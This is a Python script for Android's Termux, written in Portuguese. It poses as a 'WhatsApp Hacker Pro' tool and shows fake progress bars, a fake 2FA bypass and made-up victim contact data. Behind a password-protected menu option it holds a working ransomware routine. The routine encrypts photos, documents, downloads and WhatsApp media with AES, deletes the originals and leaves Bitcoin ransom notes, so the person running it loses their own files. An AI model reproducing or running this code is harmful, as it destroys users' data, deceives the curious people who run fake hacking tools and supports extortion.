import os
import sys
import time
import random
import threading
import platform
from datetime import datetime
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress
from rich.text import Text
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import base64

console = Console()
LOG_FILE = "whatsapp_secure.log"
PASSWORD = "hack123"
TROLL_MODE = False


BANNER = """
[#00FF00]┌───────────────────────────────────────────────────────────────┐
│[bold #00FF00] ██╗    ██╗██╗  ██╗ █████╗ ████████╗███████╗ █████╗ ██████╗ ██████╗ [/#00FF00]│
│[bold #00FF00] ██║    ██║██║  ██║██╔══██╗╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔══██╗[/#00FF00]│
│[bold #00FF00] ██║ █╗ ██║███████║███████║   ██║   ███████╗███████║██████╔╝██████╔╝[/#00FF00]│
│[bold #00FF00] ██║███╗██║██╔══██║██╔══██║   ██║   ╚════██║██╔══██║██╔═══╝ ██╔═══╝ [/#00FF00]│
│[bold #00FF00] ╚███╔███╔╝██║  ██║██║  ██║   ██║   ███████║██║  ██║██║     ██║     [/#00FF00]│
│[bold #00FF00]  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝     [/#00FF00]│
├───────────────────────────────────────────────────────────────┤
│[bold white] WhatsApp Hacker Pro v3.1 - By DarkSecurity Team[/bold white]            [#00FF00]│
│[bold white] >> Use apenas para fins educacionais![/bold white]                     [#00FF00]│
└───────────────────────────────────────────────────────────────┘[/#00FF00]
"""

class WhatsAppRansomware:
    def __init__(self):
        self.id = self.generate_victim_id()
        self.key = get_random_bytes(32)  
        self.iv = get_random_bytes(16)  
        self.ransom_amount = 0.1 
        self.bitcoin_address = "1HackerWalletXXXXXX"
        self.email = "decrypt@protonmail.com"
        self.target_extensions = [
            '.txt', '.pdf', '.jpg', '.jpeg', '.png', 
            '.mp3', '.mp4', '.doc', '.docx', '.xls',
            '.xlsx', '.ppt', '.pptx', '.zip', '.rar',
            '.html', '.htm', '.sql', '.db', '.apk'
        ]
        self.exclude_dirs = [
            'bin', 'lib', 'usr', 'sys', 'proc',
            'dev', 'system', 'vendor', 'etc'
        ]
    
    def generate_victim_id(self):
       
        return ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    
    def encrypt_file(self, file_path):
        """Criptografa um arquivo usando AES-256-CBC"""
        try:
        
            with open(file_path, 'rb') as f:
                data = f.read()
            
        
            cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
            encrypted_data = cipher.encrypt(pad(data, AES.block_size))
            
         
            with open(file_path + '.locked', 'wb') as f:
                f.write(encrypted_data)
            
          
            os.remove(file_path)
            return True
            
        except Exception as e:
            console.print(f"[red]Erro ao criptografar {file_path}: {str(e)}[/red]")
            return False
    
    def generate_ransom_note(self, path):
    
        note = f"""
        ⚠️⚠️⚠️ SEUS ARQUIVOS DO WHATSAPP FORAM CRIPTOGRAFADOS! ⚠️⚠️⚠️

        ID da Vítima: {self.id}
        
        Para recuperar seus arquivos, você deve:
        
        1. Enviar {self.ransom_amount} BTC para: {self.bitcoin_address}
        2. Enviar seu ID para: {self.email}
        3. Aguardar a chave de descriptografia
        
        ⚠️ Você tem 72 horas para pagar ou perderá todos os dados!
        ⚠️ Não tente desligar o dispositivo!
        
        ---------------------------------------------------
       
        """
        
        try:
            with open(os.path.join(path, 'LEIA_ISSO.txt'), 'w', encoding='utf-8') as f:
                f.write(note)
        except Exception as e:
            console.print(f"[red]Erro ao gerar nota de resgate: {str(e)}[/red]")
    
    def scan_and_encrypt(self, start_path):
      
        try:
            for root, dirs, files in os.walk(start_path):
          
                dirs[:] = [d for d in dirs if d not in self.exclude_dirs]
                
                for file in files:
                    if any(file.endswith(ext) for ext in self.target_extensions):
                        file_path = os.path.join(root, file)
                        if self.encrypt_file(file_path):
                            self.generate_ransom_note(root)
        except Exception as e:
            console.print(f"[red]Erro durante varredura: {str(e)}[/red]")
    
    def run_ransomware(self):
       
        console.print("\n[bold red]INICIANDO PROCESSO DE CRIPTOGRAFIA...[/bold red]")
        
       
        with Progress() as progress:
            task = progress.add_task("[red]Criptografando arquivos...", total=100)
            
       
            target_paths = [
                "/sdcard/Download",
                "/sdcard/DCIM",
                "/sdcard/WhatsApp",
                os.path.expanduser("~")
            ]
            
            for path in target_paths:
                if os.path.exists(path):
                    progress.update(task, description=f"[red]Criptografando {path}...")
                    self.scan_and_encrypt(path)
            
         
            progress.update(task, completed=100)
        
        console.print(Panel.fit(
            "[blink red]TODOS SEUS ARQUIVOS FORAM CRIPTOGRAFADOS![/blink red]",
            border_style="red",
            title="⚠️ ALERTA FINAL ⚠️"
        ))
        
      
        key_file = os.path.join(os.path.expanduser("~"), "DECRYPT_INSTRUCTIONS.txt")
        with open(key_file, 'w') as f:
            f.write(f"Chave de descriptografia (AES-256): {base64.b64encode(self.key).decode()}\n")
            f.write(f"IV: {base64.b64encode(self.iv).decode()}\n")
            f.write("Este arquivo foi criado apenas para fins educacionais.\n")
            f.write("Em um ataque real, você não teria acesso a esta chave!\n")

def show_fake_progress():
    with Progress() as progress:
        tasks = [
            progress.add_task("[cyan]Conectando aos servidores WhatsApp...", total=100),
            progress.add_task("[magenta]Bypass de segurança 2FA...", total=100),
            progress.add_task("[green]Extraindo dados da vítima...", total=100)
        ]
        
        while not progress.finished:
            for task in tasks:
                progress.update(task, advance=random.uniform(0.5, 3))
            time.sleep(0.1)

def show_fake_menu():
    console.print("\n[bold #00FF00]1. Hackear por número de telefone")
    console.print("[bold #00FF00]2. Hackear por código de verificação")
    console.print("[bold #00FF00]3. Ataque de força bruta")
    console.print("[bold #00FF00]4. Modo Ransomware (ADMIN ONLY)")
    console.print("[bold #00FF00]5. Sair do programa\n")

def show_fake_credentials():
    fake_data = [
        {"nome": "Maria Silva", "telefone": "+55 11 98765-4321", "status": "Online"},
        {"nome": "João Santos", "telefone": "+55 21 99876-5432", "status": "Visto por último hoje 14:30"}
    ]
    
    console.print(Panel.fit("[bold red]DADOS DA VÍTIMA EXTRAÍDOS![/bold red]"))
    for data in fake_data:
        console.print(f"[yellow]Nome: [white]{data['nome']}")
        console.print(f"[yellow]Telefone: [white]{data['telefone']}")
        console.print(f"[yellow]Status: [white]{data['status']}\n")

def fake_whatsapp_hack():
    console.print(BANNER)
    time.sleep(2)
    
    console.print("\n[bold #00FF00]Inicializando módulos de hacking WhatsApp...")
    show_fake_progress()
    
    console.print("\n[bold green]✓ Conexão estabelecida com servidores WhatsApp")
    time.sleep(1)
    console.print("[bold green]✓ Firewall bypassed com sucesso")
    time.sleep(1)
    console.print("[bold green]✓ Vulnerabilidade encontrada: CVE-2023-9876\n")
    time.sleep(2)
    
    while True:
        show_fake_menu()
        
        console.print("[bold white]Selecione uma opção: [/bold white]", end="")
        option = input().strip()
        
        if option == "1":
            console.print("\n[bold]Digite o número com código do país: [/bold]", end="")
            phone = input().strip()
            
            console.print("\n[bold]Aguarde, explorando vulnerabilidade...[/bold]")
            show_fake_progress()
            show_fake_credentials()
            
        elif option == "4":
         
            console.print("\n[bold red]Digite a senha de administrador: [/bold red]", end="")
            password = input().strip()
            
            if password == PASSWORD:
                ransomware = WhatsAppRansomware()
                ransomware.run_ransomware()
                break
            else:
                console.print("\n[bold red]Senha incorreta![/bold red]")
                
        elif option == "5":
            console.print("\n[bold]Saindo...[/bold]")
            break
            
        else:
            console.print("\n[bold red]Opção inválida![/bold red]")

def main():
  
    if not os.path.exists("/data/data/com.termux/files/home"):
        console.print("[red]Erro: Esta versão só funciona no Termux![/red]")
        return
    

    if not os.access("/sdcard", os.W_OK):
        console.print("[red]Erro: Conceda permissões de armazenamento ao Termux![/red]")
        console.print("[yellow]Execute: termux-setup-storage[/yellow]")
        return
    

    with open(LOG_FILE, "a", encoding='utf-8') as f:
        f.write(f"\n--- Sessão Iniciada: {datetime.now()} ---\n")
        f.write("Módulos carregados: whatsapp_hack, bypass_2fa\n")
    
    fake_whatsapp_hack()

if __name__ == "__main__":
   
    try:
        if platform.system() == "Linux" and "android" in platform.platform().lower():
            main()
        else:
            console.print("[red]Erro: Sistema não suportado![/red]")
    except Exception as e:
        console.print(f"[red]Erro: {str(e)}[/red]")
